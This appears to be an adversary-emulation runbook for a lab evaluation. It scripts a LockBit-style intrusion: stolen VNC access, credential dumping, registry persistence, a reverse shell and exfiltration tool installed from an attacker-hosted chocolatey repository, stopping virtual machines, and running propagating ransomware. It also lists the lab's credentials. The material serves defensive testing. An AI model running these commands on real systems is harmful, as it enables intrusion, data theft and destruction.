# LockBit Scenario Overview

Legend of symbols:

* :bulb: - callout notes
* :heavy_exclamation_mark: - extremely important note
* :arrow_right: - Switching to another session
* :o: - Disconnect from RDP
* :red_circle: - Sign out of RDP
* :camera: - take a screenshot
* :clock2: - Record timestamp

---

## Step 0 - Red Setup

### :biohazard: Procedures

* Initiate an RDP session to the Kali attack host `corsair (223.246.0.70)`

    | IP | Username | Password |
    | -------- | -------- | -------- |
    | 223.246.0.70 | op1 | Subpar-Parabola |

* In a new terminal window, start the evalsC2server, ensuring the following
handlers are enabled:

  * Simple File Server
  * StealBit

  ```bash
  cd LockBit/Resources/control_server
  sudo go build -o controlServer main.go
  sudo ./controlServer -c config/lockbit.yml
  ```

* Right-click within the terminal window and click "Split Terminal
Horizontally". Within the new terminal, change directory to the location of the
evalsC2client.py and **use this terminal for tasking implants**.

    ```bash
  cd LockBit/Resources/control_server
    ```

* In a new terminal window elevate to sudo

    ```bash
    sudo su
    ```

    | Password |
    | -------- |
    | Subpar-Parabola |

* Start the ThunderShell server:

    ```bash
    cd LockBit/Resources/ThunderShell
    LD_LIBRARY_PATH=/home/kali/.pyenv/versions/3.7.17/lib:$LD_LIBRARY_PATH
    PYTHONPATH=/home/kali/.pyenv/versions/3.7.17/lib/python3.7/site-packages:$PYTHONPATH
    PATH=/home/kali/.pyenv/versions/3.7.17/bin:$PATH
    python3.7 ThunderShell.py default.json kali
    ```

## Step 0 - Range Setup

### :biohazard: Procedures

* On the taskbar in Kali, click the Firefox icon to open Mozilla Firefox.
Within Firefox Browse to
the following URL `http://27.21.12.121:8081/nexus`.

* Log in using the following credentials.

  | Username | Password |
  | -------- | -------- |
  | admin | admin123 |

* On the left hand side, select repositories, then click the
`chocolatey-hosted` repository.
* On the bottom half of the screen select `NuPkg Upload` > `Browse...`.
* Browse to `LockBit/Resources/payloads/`, select
the `.NuGet` package
to upload, then press `Add Package`. Repeat this for each of the following:
  * `BlockLit.1.0.1.nupkg` (LockBit Payload)
  * `Connhost.1.0.1.nupkg` (StealBit Payload)
  * `FoxAdminPro.1.0.1.nupkg` (Firefox password stealer)
  * `Termini.1.0.1.nupkg` (Thundershell reverse shell)
* After ALL four (4) packages have been added, press `Upload Package(s)`.

## Step 1 - Initial Access (Evaluation Step 9)

### :microphone: Voice Track

The LockBit affiliate gains initial access to the victim environment via
compromised credentials providing VNC access to `quirrell (10.111.9.202)` as
`decryptmalfoy.net\gornuk`.

### :biohazard: Procedures

* :arrow_right: From the Windows jumpbox `spitfire (223.246.0.90)`, search for and
open TightVNC > TightVNC Viewer. Enter the following to connect to
`quirrell (10.111.9.202)`, click the `Connect` button then paste the password into
the password field when prompted:

    | VNC server | Password |
    | -------- | -------- |
    | 10.111.9.202::5900 | test1234 |

* :arrow_right: log in using gornuk's credentials

    | Username | Password |
    | -------- | -------- |
    | decryptmalfoy\gornuk | Concave-Monsieur |

* :camera: Screenshot the vnc connection

### :mag: Reference Code & Reporting

> :information_source: **NOTE:** Not all techniques listed in this table
directly map to evaluation substeps

| Red Team Activity | Source Code Link | ATT&CK Technique | Relevant CTI Report |
| ----------------- | ---------------- | ---------------- | ------------------- |
| LockBit affiliate leverages TightVNC to access `quirrell (10.111.9.202)` | - | T1133 External Remote Services | [Antiy Labs](https://www.Antiy.net/p/analysis-of-lockbit-ransomware-samples-and-considerations-for-defense-against-targeted-ransomware/) |
| LockBit affiliate authenticates using valid VNC account | - | T1078 Valid Accounts | [Antiy Labs](https://www.Antiy.net/p/analysis-of-lockbit-ransomware-samples-and-considerations-for-defense-against-targeted-ransomware/) |

## Step 2 - Execution (Evaluation Step 10)

### :microphone: Voice Track

The LockBit affiliate executes several discovery commands to enumerate domain
controllers, domain trusts, cached passwords, domain and local groups, and
services running on `quirrell (10.111.9.202)`.

### :biohazard: Procedures

* Within your TightVNC session to `quirrell (10.111.9.202)`, search for Command
Prompt and right-click to Run as Administrator

* Within the Command Prompt, execute the following to discover domain
information:

    ```batch
    nltest /dclist:decryptmalfoy.net & cmdkey /list & net group "Domain Admins" /domain & net group "Enterprise Admins" /domain & net localgroup Administrators /domain & net localgroup Administrators
    ```

* :camera: Screenshot the command output.

* Within the Command Prompt, execute the following to gather information about
running services:

    ```batch
    powershell /c "get-wmiobject Win32_Service |where-object { $_.PathName -notmatch \"C:\Windows\" -and $_.State -eq \"Running\"} | select-object name, displayname, state, pathname"
    ```

* :camera: Screenshot the command output.

* Minimize the elevated Command Prompt for later use

### :mag: Reference Code & Reporting

> :information_source: **NOTE:** Not all techniques listed in this table
directly map to evaluation substeps

| Red Team Activity | Source Code Link | ATT&CK Technique | Relevant CTI Report |
| ----------------- | ---------------- | ---------------- | ------------------- |
| LockBit affiliate opens Command Prompt | - | T1059.003 Command and Scripting Interpreter: Windows Command Shell | [nccgroup](https://research.nccgroup.com/2022/08/19/back-in-black-unlocking-a-lockbit-3-0-ransomware-attack/) |
| LockBit affiliate executes `nltest /dclist:` | - | T1018 Remote System Discovery | [nccgroup](https://research.nccgroup.com/2022/08/19/back-in-black-unlocking-a-lockbit-3-0-ransomware-attack/) |
| LockBit affiliate executes `nltest /domain_trusts` | - | T1482 Domain Trust Discovery | [nccgroup](https://research.nccgroup.com/2022/08/19/back-in-black-unlocking-a-lockbit-3-0-ransomware-attack/) |
| LockBit affiliate executes `cmdkey /list` | - | T1555 Credentials from Password Stores | [nccgroup](https://research.nccgroup.com/2022/08/19/back-in-black-unlocking-a-lockbit-3-0-ransomware-attack/) |
| LockBit affiliate executes `net group` | - | T1069.002 Permission Groups Discovery: Domain Groups | [nccgroup](https://research.nccgroup.com/2022/08/19/back-in-black-unlocking-a-lockbit-3-0-ransomware-attack/) |
| LockBit affiliate executes `net localgroup` | - | T1069.001 Permission Groups Discovery: Local Groups | [nccgroup](https://research.nccgroup.com/2022/08/19/back-in-black-unlocking-a-lockbit-3-0-ransomware-attack/) |
| LockBit affiliate executes PowerShell | - | T1059.001 Command and Scripting Interpreter: PowerShell | [nccgroup](https://research.nccgroup.com/2022/08/19/back-in-black-unlocking-a-lockbit-3-0-ransomware-attack/) |
| LockBit affiliate enumerates running system services | - | T1007 System Service Discovery | [nccgroup](https://research.nccgroup.com/2022/08/19/back-in-black-unlocking-a-lockbit-3-0-ransomware-attack/) |

## Step 3 - Persistence (Evaluation Step 11)

### :microphone: Voice Track

The LockBit affiliate installs persistence on `quirrell (10.111.9.202)` by modifying
the `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`
subkey to enable automatic login.

### :biohazard: Procedures

* Within your TightVNC session to `quirrell (10.111.9.202)`, search for Registry
Editor and right-click to Run as Administrator.

* Browse to `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`
and add/edit the following:
  * AutoAdminLogin
    * Click Edit > New > String Value (if the value already exists, modify the
    existing one)
    * Type `AutoAdminLogon`, press Enter then double click the new key
    `AutoAdminLogon`
    * In the Edit String dialog, type `1` for "Value data" then click OK
  * DefaultUserName
    * Click Edit > New > String Value (if the value already exists, modify the
    existing one)
    * Type `DefaultUserName`, press Enter then double click the new key
    `DefaultUserName`
    * In the Edit String dialog, type `gornuk` for "Value data" then click OK
  * DefaultPassword
    * Click Edit > New > String Value (if the value already exists, modify the
    existing one)
    * Type `DefaultPassword`, press Enter then double click the new key
    `DefaultPassword`
    * In the Edit String dialog, type `Concave-Monsieur` for "Value data" then click
    OK
  * DefaultDomainName
    * Click Edit > New > String Value (if the value already exists, modify the
    existing one)
    * Type `DefaultDomainName`, press Enter then double click the new key
    `DefaultDomainName`
    * In the Edit String dialog, type `decryptmalfoy` for "Value data" then
    click OK

### :mag: Reference Code & Reporting

> :information_source: **NOTE:** Not all techniques listed in this table
directly map to evaluation substeps

| Red Team Activity | Source Code Link | ATT&CK Technique | Relevant CTI Report |
| ----------------- | ---------------- | ---------------- | ------------------- |
| LockBit affiliate modifies the registry to enable automatic logon | - | T1552.002 Unsecured Credentials: Credentials in Registry | [CISA](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a) |

## Step 4 - Credential Access (Evaluation Step 12)

### :microphone: Voice Track

The LockBit affiliate ingresses the FireFox password dumper using `chocolatey`
then dumps passwords from the FireFox browser, recovering the domain admin
credentials to access the Linux KVM server.

### :biohazard: Procedures

* Within your TightVNC session to `quirrell (10.111.9.202)`, using the elevated
Command Prompt minimized earlier, execute `chocolatey` to download the FireFox
password dumper:

    ```bat
    choco install FoxAdminPro -y
    ```

* :camera: Screenshot the FoxAdminPro screenshot.

* Within the Command Prompt, execute the FireFox password dumper:

    ```bat
    FoxAdminPro -d C:\Users\gornuk\AppData\Roaming\Mozilla\Firefox\Profiles\ohbrdd1o.default-release\
    ```

* :camera: Screenshot the command output.

* Confirm the output contains the domain admin credentials

### :mag: Reference Code & Reporting

> :information_source: **NOTE:** Not all techniques listed in this table
directly map to evaluation substeps

| Red Team Activity | Source Code Link | ATT&CK Technique | Relevant CTI Report |
| ----------------- | ---------------- | ---------------- | ------------------- |
| LockBit affiliate uses chocolatey to ingress additional tooling | - | T1072 Software Deployment Tools | [CISA](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a) |
| chocolatey downloads FireFox password dumper | - | T1105 Ingress Tool Transfer | [CISA](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a) |
| LockBit affiliate executes FireFox password dumper | - | T1555.003 Credentials from Password Stores: Credentials from Web Browsers | [CISA](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a) |

## Step 5 - Lateral Movement to Linux Server (Evaluation Step 13)

### :microphone: Voice Track

The LockBit affiliate uses the recovered password to SSH to the Linux KVM
server `horcrux (10.111.8.40)`. After performing discovery, the LockBit affiliate
performs the following actions:

* Stop virtual machines
* Disable autostart

### :biohazard: Procedures

* Within the elevated Command Prompt, SSH to the Linux KVM server
`horcrux (10.111.8.40)`:

    ```bat
    ssh gornuk.da@10.111.8.40
    ```

    | Password |
    | -------- |
    | Frown-Cement |

* Within the SSH prompt, enumerate virtual machines running:

    ```bash
    sudo podman ps -a
    ```

* :camera: Screenshot the command output.

* Within the SSH prompt, execute the following commands:
  * Stop virtual machines

    ```bash
    sudo podman stop -a
    ```

  * Disable autostart

    ```bash
    sudo systemctl disable --now podman
    sudo systemctl disable --now podman-restart
    ```

  * :camera: Screenshot the command output.
  
* Exit the SSH prompt

    ```bash
    exit
    ```

### :mag: Reference Code & Reporting

> :information_source: **NOTE:** Not all techniques listed in this table
directly map to evaluation substeps

| Red Team Activity | Source Code Link | ATT&CK Technique | Relevant CTI Report |
| ----------------- | ---------------- | ---------------- | ------------------- |
| LockBit affiliate accesses Linux host over SSH | - | T1021.004 Remote Services: SSH | - |
| LockBit affiliate enumerates VMs | - | T1057 Process Discovery | [Trend Micro](https://www.trendmicro.com/en_th/research/22/a/analysis-and-Impact-of-lockbit-ransomwares-first-linux-and-vmware-esxi-variant.html) |
| LockBit affiliate stops VMs and autostart | - | T1489 Service Stop | [Trend Micro](https://www.trendmicro.com/en_th/research/22/a/analysis-and-Impact-of-lockbit-ransomwares-first-linux-and-vmware-esxi-variant.html) |

## Step 6 - Privilege Escalation and Command & Control (Evaluation Step 14)

### :microphone: Voice Track

The LockBit affiliate ingresses ThunderShell, a PowerShell based remote access
tool, using chocolatey. The LockBit affiliate then opens PowerShell with
administrative privileges and executes ThunderShell.

ThunderShell establishes communications over HTTP to the adversary C2 server.

### :biohazard: Procedures

* Within the elevated Command Prompt, execute `chocolatey` to download
`ThunderShell`

    ```bat
    choco install Termini -y
    ```

* :camera: Screenshot the installation output.

* Search for PowerShell and right-click to Run as Administrator

* Paste the following commands into the PowerShell Window and press enter

    ```PowerShell
    Set-ExecutionPolicy bypass
    import-module C:\ProgramData\chocolatey\lib\Termini\tools\termini.ps1
    ```

* Press [A] or [Y] and press [ENTER] when prompted.

* Minimize all windows on `quirrell (10.111.9.202)` then minimize the VNC

* :arrow_right: Switch to Kali and confirm in the ThunderShell C2 tab the
C2 registration of a new ThunderShell implant

* :camera: Screenshot the Thundershell terminal window showing the new session.

### :mag: Reference Code & Reporting

> :information_source: **NOTE:** Not all techniques listed in this table
directly map to evaluation substeps

| Red Team Activity | Source Code Link | ATT&CK Technique | Relevant CTI Report |
| ----------------- | ---------------- | ---------------- | ------------------- |
| chocolatey downloads ThunderShell | - | T1105 Ingress Tool Transfer | [CISA](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a) |
| ThunderShell is executed via PowerShell | - | T1059.001 Command and Scripting Interpreter: PowerShell | - |
| ThunderShell communicates over HTTP | - | T1071.001 Application Layer Protocol: Web Protocols | - |

## Step 7 - Exfiltration (Evaluation Step 15)

### :microphone: Voice Track

Leveraging `ThunderShell` to remotely access `quirrell (10.99.9.202)`, the LockBit
affiliate executes `chocolatey` to download `StealBit` for file discovery, system
information gathering, and data exfiltration.

`StealBit` is an exfiltration tool utilizing native APIs and threading to
optimize execution and exfiltration of files. It also performs the following
behaviors:

* Checks if being debugged and infinitely loops
* Recursively enumerates folders and files, avoiding deny-list items
* Checks C2 server connectivity using an HTTP GET request
* Exfiltrates files using HTTP PUT requests
* Deletes itself on completion

### :biohazard: Procedures

* In the ThunderShell prompt, enter the following command to interact with the
newly registered shell:

    ```bash
    interact 1
    ```

* In the shell interaction prompt, enter the following command to download
`StealBit` to `quirrell (10.111.9.202)`:

    ```bash
    choco install connhost -y
    ```

* :camera: Screenshot the connhost install output.

* In the shell interaction prompt, enter the following command to execute
`StealBit`:

    ```bash
    connhost.exe C:\\Users\\ -d
    ```

* Switch to the evalsC2server tab and confirm the exfiltrated files were
received successfully. The ThunderShell prompt should print out the following
once StealBit has finished execution:

   ```text
   [DEBUG] [2024-07-12T13:13:11] Closing completion port handle.
   ```

* :camera: Screenshot the Thundershell window containing the StealBit
output when it's finished running.

* :camera: Screenshot the C2 server window containing the StealBit
output when it's finished running.

### :mag: Reference Code & Reporting

> :information_source: **NOTE:** Not all techniques listed in this table
directly map to evaluation substeps

| Red Team Activity | Source Code Link | ATT&CK Technique | Relevant CTI Report |
| ----------------- | ---------------- | ---------------- | ------------------- |
| `ThunderShell` executes `chocolatey` | - | T1059.001 Command and Scripting Interpreter: PowerShell | [CISA](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-165a)<br>[Trend Micro](https://www.trendmicro.com/vinfo/us/security/news/ransomware-spotlight/ransomware-spotlight-royal) |
| `chocolatey` downloads `StealBit` | - | T1105 Ingress Tool Transfer | [CISA](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a) |
| `ThunderShell` executes `StealBit` | - | T1059.001 Command and Scripting Interpreter: PowerShell | [CISA](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-165a)<br>[Trend Micro](https://www.trendmicro.com/vinfo/us/security/news/ransomware-spotlight/ransomware-spotlight-royal) |
| `StealBit` uses Windows API calls | [nt.cpp](../Resources/Stealbit/src/nt.cpp) | T1106 Native API | [accenture](https://web.archive.org/web/20220924195948/https://acn-marketing-blog.accenture.com/wp-content/uploads/2022/05/CIFR-Exfil-Tool-Comparison-Final.pdf) |
| `StealBit` checks if being debugged | [IsProcessBeingDebugged](../Resources/Stealbit/src/util.cpp#L103-L109) | T1622 Debugger Evasion | [accenture](https://web.archive.org/web/20220924195948/https://acn-marketing-blog.accenture.com/wp-content/uploads/2022/05/CIFR-Exfil-Tool-Comparison-Final.pdf) |
| `StealBit` discovers Windows computer name via GetComputerName | [GetSystemComputerName](../Resources/Stealbit/src/util.cpp#L58-L69) | T1082 System Information Discovery | [accenture](https://web.archive.org/web/20220924195948/https://acn-marketing-blog.accenture.com/wp-content/uploads/2022/05/CIFR-Exfil-Tool-Comparison-Final.pdf) |
| `StealBit` discovers domain name using gethostname and getaddrinfo | [GetSystemDomainName](../Resources/Stealbit/src/util.cpp#L71-L98) | T1016 System Network Configuration Discovery| [accenture](https://web.archive.org/web/20220924195948/https://acn-marketing-blog.accenture.com/wp-content/uploads/2022/05/CIFR-Exfil-Tool-Comparison-Final.pdf) |
| `StealBit` enumerates folders and files | [enumerate.cpp](../Resources/Stealbit/src/enumerate.cpp) | T1083 File and Directory Discovery |[accenture](https://web.archive.org/web/20220924195948/https://acn-marketing-blog.accenture.com/wp-content/uploads/2022/05/CIFR-Exfil-Tool-Comparison-Final.pdf) |
| `StealBit` automatically collects non-denylisted files | [enumerate.cpp](../Resources/Stealbit/src/enumerate.cpp) | T1119 Automated Collection |[accenture](https://web.archive.org/web/20220924195948/https://acn-marketing-blog.accenture.com/wp-content/uploads/2022/05/CIFR-Exfil-Tool-Comparison-Final.pdf) |
| `StealBit` automatically exfiltrates non-denylisted files | [io.cpp](../Resources/Stealbit/src/io.cpp) | T1020.001 Automated Exfiltration |[accenture](https://web.archive.org/web/20220924195948/https://acn-marketing-blog.accenture.com/wp-content/uploads/2022/05/CIFR-Exfil-Tool-Comparison-Final.pdf) |
| `StealBit` checks C2 server connectivity using an HTTP GET request | [HTTPRequestHeartbeat](../Resources/Stealbit/src/networking.cpp#L7-L25) | T1071.001 Application Layer Protocol: Web Protocols | [accenture](https://web.archive.org/web/20220924195948/https://acn-marketing-blog.accenture.com/wp-content/uploads/2022/05/CIFR-Exfil-Tool-Comparison-Final.pdf)<br>[Cybereason](https://www.cybereason.com/blog/research/threat-analysis-report-inside-the-lockbit-arsenal-the-stealbit-exfiltration-tool)<br>[Yoroi](https://yoroi.company/en/research/hunting-the-lockbit-gangs-exfiltration-infrastructures/) |
| `StealBit` exfiltrates contents using HTTP PUT requests | [UploadFilePUTRequest](../Resources/Stealbit/src/networking.cpp#L48-L90) | T1041 Exfiltration Over C2 Channel | [accenture](https://web.archive.org/web/20220924195948/https://acn-marketing-blog.accenture.com/wp-content/uploads/2022/05/CIFR-Exfil-Tool-Comparison-Final.pdf)<br>[Cybereason](https://www.cybereason.com/blog/research/threat-analysis-report-inside-the-lockbit-arsenal-the-stealbit-exfiltration-tool)<br>[Yoroi](https://yoroi.company/en/research/hunting-the-lockbit-gangs-exfiltration-infrastructures/) |
| `StealBit` deletes itself | [DeleteApplicationImageAfterExecution](../Resources/Stealbit/src/util.cpp#L111-L143) | T1070.004 Indicator Removal: File Deletion | [accenture](https://web.archive.org/web/20220924195948/https://acn-marketing-blog.accenture.com/wp-content/uploads/2022/05/CIFR-Exfil-Tool-Comparison-Final.pdf) |

## Step 8 - Impact (Evaluation Step 16)

### :microphone: Voice Track

After exfiltration has completed, the LockBit affiliate leverages
`ThunderShell` to execute `chocolatey` to download then execute the `LockBit`
ransomware at `C:\ProgramData\chocolatey\lib\BlockLit\tools\main.exe`.

The `LockBit` ransomware will perform the following behaviors:

* Hides threads from debuggers
* Uses Windows API hashing to perform dynamic API resolution for certain APIs
* Gathers username, domain, and hostname information
* Gathers system information (OS version and architecture)
* Create a mutex to ensure unique execution
* Check system install and default UI languages against allow-list to avoid
executing on certain systems
* Enumerates all logical drives to determine encryption targets
* Modifies several registry keys to disable the Windows firewall
* Deletes shadow copies using WMI and Windows API calls
* Uses `bcdedit.exe` to disable automatic Windows recovery features
* Discovers and pings the local network for discovery of additional targets
* Propagates using PsExec
* Terminates processes that may interfere with encryption
* Terminates and disables services that may interfere with encryption
* Clears the Recycle Bin
* Sets a custom icon for encrypted files with the `.sk12uyqzk` extension via
registry writes to HKCR
* Generates 2048-bit RSA session keys to encrypt the AES keys used for file
encryption and stores them in `HKCU\SOFTWARE\BlockBlit`
* Enumerates and encrypts target files in each discovered drive using 256-bit AES
  * Main `C:` drive and the discovered mounted file share `Z:` drive
* Drops a ransom note in traversed directories
* Changes the desktop background using registry writes to `HKCU\Control Panel\Desktop`
* Clears Windows Event logs and disables event log channels
* Deletes itself on completion by dropping and executing an embedded helper
executable at `C:\Windows\Temp\381jwk.tmp`.
  * The helper executable will overwrite and rename the LockBit binary prior to
  removing it from disk.

### :biohazard: Procedures

* Switch to the ThunderShell tab and enter the following command to download
`LockBit` to `quirrell (10.99.9.202)`:

    ```cmd
    choco install BlockLit -y
    ```

* :camera: Screenshot the installation output in the Thundershell window.

* In the shell interaction prompt, enter the following command to execute
`LockBit` with propagation enabled:

    ```cmd
    C:\ProgramData\chocolatey\lib\BlockLit\tools\main.exe -ps
    ```

* LockBit will return execution output to the Thundershell prompt when complete
(allow 10-15 minutes for completion)

* :camera: Screenshot the Thundershell window containing the LockBit output.

### :mag: Reference Code & Reporting

> :information_source: **NOTE:** Not all techniques listed in this table
directly map to evaluation substeps

| Red Team Activity | Source Code Link | ATT&CK Technique | Relevant CTI Report |
| ----------------- | ---------------- | ---------------- | ------------------- |
| LockBit uses Windows API calls | [winapihelper.cpp](../Resources/Lockbit/src/common/util/winapihelper.cpp) | T1106 Native API | [Antiy](https://www.Antiy.net/p/analysis-of-lockbit-ransomware-samples-and-considerations-for-defense-against-targeted-ransomware/)<br>[CISA](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a)<br>[CISA](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-165a) |
| LockBit uses Windows API hashing for certain API calls | [winapihelper.cpp](../Resources/Lockbit/src/common/util/winapihelper.cpp) | T1027.007 Obfuscated Files or Information: Dynamic API Resolution | [Red Piranha](https://redpiranha.net/news/look-lockbit-3-ransomware) |
| LockBit hides threads via NtSetInformationThread | [HideThreadFromDebugger](../Resources/Lockbit/src/lockbit_main/def_evasion/hide_thread.cpp#L8-L36) | T1622 Debugger Evasion | [Antiy](https://www.Antiy.net/p/analysis-of-lockbit-ransomware-samples-and-considerations-for-defense-against-targeted-ransomware/)<br>[Trend Micro](https://www.trendmicro.com/en_za/research/22/g/lockbit-ransomware-group-augments-its-latest-variant--lockbit-3-.html) |
| LockBit discovers username via GetUserNameExW | [GetUsername](../Resources/Lockbit/src/lockbit_main/discovery.cpp#L20-L50) | T1033 System Owner/User Discovery | [CISA](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a) |
| LockBit discovers domain via GetComputerNameExW | [GetDomain](../Resources/Lockbit/src/lockbit_main/discovery.cpp#L81-L113) | T1016 System Network Configuration Discovery | [CISA](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a) |
| LockBit discovers hostname via GetComputerNameW | [GetHostname](../Resources/Lockbit/src/lockbit_main/discovery.cpp#L52-L79) | T1082 System Information Discovery | [CISA](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a) |
| LockBit discovers OS architecture via GetNativeSystemInfo | [GetOsArchitecture](../Resources/Lockbit/src/lockbit_main/discovery.cpp#L115-L148) | T1082 System Information Discovery | [CISA](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a) |
| LockBit discover OS version via RtlGetVersion | [GetOsVersionString](../Resources/Lockbit/src/lockbit_main/discovery.cpp#L150-L182) | T1082 System Information Discovery | [CISA](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a) |
| LockBit creates and checks for a mutex | [CheckCreateMutex](../Resources/Lockbit/src/lockbit_main/guardrails/mutex.cpp#L19-L63) | T1480 Execution Guardrails | [CISA](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a) |
| LockBit performs system language checks via NtQueryInstallUILanguage and NtQueryDefaultUILanguage | [SystemHasExcludedLang](../Resources/Lockbit/src/lockbit_main/guardrails/lang.cpp#L36-L101) | T1614.001 System Location Discovery: System Language Discovery | [Antiy](https://www.Antiy.net/p/analysis-of-lockbit-ransomware-samples-and-considerations-for-defense-against-targeted-ransomware/)<br>[CISA](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a)<br>[CISA](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-165a) |
| LockBit enumerates logical drives via GetLogicalDriveStringsW | [GetLogicalDrives](../Resources/Lockbit/src/common/enumerate.cpp#L22-L65) | T1083 File and Directory Discovery | [Sangfor](https://www.sangfor.com/farsight-labs-threat-intelligence/cybersecurity/lockbit-green-ransomware-conti-based-encryptor) |
| LockBit disables the firewall via RegCreateKeyExW and RegSetValueExW | [DisableFirewall](../Resources/Lockbit/src/lockbit_main/def_evasion/disable_security.cpp#L8-L53) | T1562.004 Impair Defenses: Disable or Modify System Firewall | [CISA](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a)<br>[CISA](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-165a) |
| LockBit executes WMI query "SELECT * FROM Win32_ShadowCopy" via CoInitializeEx, IWbemLocator::ConnectServer, and IWbemServices::ExecQuery | [DeleteShadowCopies](../Resources/Lockbit/src/lockbit_main/tamper/shadow.cpp#L12-L180) | T1047 Windows Management Instrumentation | [CISA](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a)<br>[Cybereason](https://www.cybereason.com/hubfs/dam/collateral/reports/Threat-Analysis-Assemble-LockBit-3.pdf)<br>[Trend Micro](https://www.trendmicro.com/en_za/research/22/g/lockbit-ransomware-group-augments-its-latest-variant--lockbit-3-.html) |
| LockBit deletes shadow copies via IWbemServices::DeleteInstance | [deleteDiscoveredShadowCopies](../Resources/Lockbit/src/lockbit_main/tamper/shadow.cpp#L182-L234) | T1490 Inhibit System Recovery | [CISA](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a)<br>[Cybereason](https://www.cybereason.com/hubfs/dam/collateral/reports/Threat-Analysis-Assemble-LockBit-3.pdf)<br>[Trend Micro](https://www.trendmicro.com/en_za/research/22/g/lockbit-ransomware-group-augments-its-latest-variant--lockbit-3-.html) |
| LockBit uses `bcdedit.exe` to disable automatic Windows recovery features | [DisableBootRecovery](../Resources/Lockbit/src/lockbit_main/tamper/boot_recovery.cpp#L9-L65) | T1490 Inhibit System Recovery | [Cybereason]( https://www.cybereason.com/blog/threat-analysis-report-lockbit-2.0-all-paths-lead-to-ransom)<br>[Symantec](https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/lockbit-targets-servers) |
| LockBit discovers local IP networks via GetAdaptersInfo | [GetLocalIpv4AndCidr](../Resources/Lockbit/src/lockbit_main/propagate/local_ips.cpp#L57-L140) | T1016 System Network Configuration Discovery  | [CISA](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a)<br>[The DFIR Report](https://thedfirreport.com/2020/06/10/lockbit-ransomware-why-you-no-spread/) |
| LockBit discovers additional targets via IcmpSendEcho | [sendPing](../Resources/Lockbit/src/lockbit_main/propagate/ping.cpp#L10-L49) | T1018 Remote System Discovery  | [CISA](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a)<br>[The DFIR Report](https://thedfirreport.com/2020/06/10/lockbit-ransomware-why-you-no-spread/) |
| LockBit executes PsExec to propagate to additional targets | [PerformPsExecPropagation](../Resources/Lockbit/src/lockbit_main/propagate/propagate.cpp#L161-L231) | T1021.002 Remote Services: SMB/Windows Admin Shares | [CISA](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a)<br>[Red Piranha](https://redpiranha.net/news/look-lockbit-3-ransomware) |
| LockBit affiliate authenticates with `decryptmalfoy\gornuk.da` credentials | - | T1078 Valid Accounts | - |
| PsExec creates a service | - | T1543.003 Create or Modify System Process: Windows Service | [CISA](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a)<br>[Red Piranha](https://redpiranha.net/news/look-lockbit-3-ransomware) |
| PsExec copies LockBit to additional targets | - | T1570 Lateral Tool Transfer | [CISA](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a)<br>[Red Piranha](https://redpiranha.net/news/look-lockbit-3-ransomware) |
| PsExec executes LockBit on additional targets | - | T1569.002 System Services: Service Execution | [CISA](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a)<br>[Red Piranha](https://redpiranha.net/news/look-lockbit-3-ransomware) |
| LockBit enumerates processes to stop via CreateToolhelp32Snapshot, Process32FirstW, and Process32NextW | [KillProcesses](../Resources/Lockbit/src/lockbit_main/tamper/proc.cpp#L12-L116) | T1057 Process Discovery | [CISA](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a)<br>[CISA](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-165a)<br>[Cybereason](https://www.cybereason.com/hubfs/dam/collateral/reports/Threat-Analysis-Assemble-LockBit-3.pdf) |
| LockBit terminates processes via OpenProcess and TerminateProcess | [KillProcesses](../Resources/Lockbit/src/lockbit_main/tamper/proc.cpp#L12-L116) | T1489 Service Stop | [CISA](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a)<br>[CISA](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-165a)<br>[Cybereason](https://www.cybereason.com/hubfs/dam/collateral/reports/Threat-Analysis-Assemble-LockBit-3.pdf) |
| LockBit terminates and disables services via ControlService and ChangeServiceConfigW | [TerminateAndDisableServices](../Resources/Lockbit/src/lockbit_main/tamper/svc.cpp#L21-L78) | T1489 Service Stop | [CISA](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a)<br>[CISA](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-165a)<br>[Cybereason](https://www.cybereason.com/hubfs/dam/collateral/reports/Threat-Analysis-Assemble-LockBit-3.pdf) |
| LockBit clears the recycle bin | [ClearRecycleBin](../Resources/Lockbit/src/common/impact/recycling.cpp#L8-L33) | T1485 Data Destruction | [CISA](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a) |
